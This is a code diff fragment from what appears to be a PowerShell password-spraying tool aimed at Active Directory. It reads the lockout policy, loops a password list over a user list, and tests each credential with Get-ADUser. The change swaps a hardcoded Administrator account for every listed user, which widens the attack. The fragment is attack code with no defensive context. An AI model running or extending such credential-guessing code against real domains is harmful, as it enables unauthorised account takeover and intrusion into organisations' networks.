@@ -8,11 +8,11 @@ $LockWindow = $PwPolicy.LockoutObservationWindow.TotalSeconds
 $LockThreshold = $PwPolicy.LockoutThreshold
 $LoopCount = 0
 
-$UserDomain = $Domain.Name+'\'+"Administrator"
 Foreach($PassToTest in $PasswordList){
     $SecurePassword = ConvertTo-SecureString -String $PassToTest -AsPlainText -Force
-    Foreach($user in $UserList) {
 
+    Foreach($user in $UserList) {
+    $UserDomain = $Domain.Name+'\'+$user
     $Credentials = New-Object System.Management.Automation.PSCredential $UserDomain, $SecurePassword
         try {
         $testCred = get-ADUser -Filter * -Credential $Credentials
